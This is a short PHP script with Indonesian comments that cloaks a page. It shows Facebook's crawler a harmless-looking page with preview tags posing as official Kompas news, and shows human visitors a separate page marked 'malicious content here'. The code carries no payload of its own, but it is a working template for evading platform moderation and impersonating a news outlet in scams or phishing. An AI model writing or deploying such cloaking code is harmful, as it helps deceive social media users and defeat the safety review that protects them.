<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($userAgent, 'facebookexternalhit') !== false) {
?>
<!-- Bagian untuk Bot Facebook -->
<html>
<head>
  <meta property="og:title" content="Berita Resmi Kompas" />
  <meta property="og:image" content="https://scontent.fbdo6-1.fna.fbcdn.net/v/t45.1600-4/674851405_1877666896250097_6451253269856539970_n.jpg?stp=cp0_dst-jpg_fr_q75_spS444_tt6&_nc_cat=106&ccb=1-7&_nc_sid=f0a831&_nc_eui2=AeHttweNTKWRgt-8W-dfToMvRIk-Iiile29EiT4iKKV7b5lwcugaRhEQkvAtYIqzvOwUQW0O59j_akVnKoO6Kfh6&_nc_ohc=VBEVmA77vc8Q7kNvwFDmhn0&_nc_oc=AdqLXAzPdpnzVqBF7USt5K17U15SX9H8o1jcaw3EDElyJpTO41SLMMZQD_NWtbwMAFg&_nc_zt=1&_nc_ht=scontent.fbdo6-1.fna&_nc_gid=TUcNJHuXU9YpqEDo-4PLfQ&_nc_ss=7a3a8&oh=00_Af3d70OLnTrhAUxhhUONa_w_lcFw3Gwf-pWlvhwTHhOXng&oe=69E8C2FC" />
</head>
<body>Halaman normal</body>
</html>

<?php } else { ?>

<!-- Bagian untuk Manusia -->
<html>
<head>
  <title>Halaman Asli</title>
</head>
<body>Konten jahat disini</body>
</html>

<?php } ?>
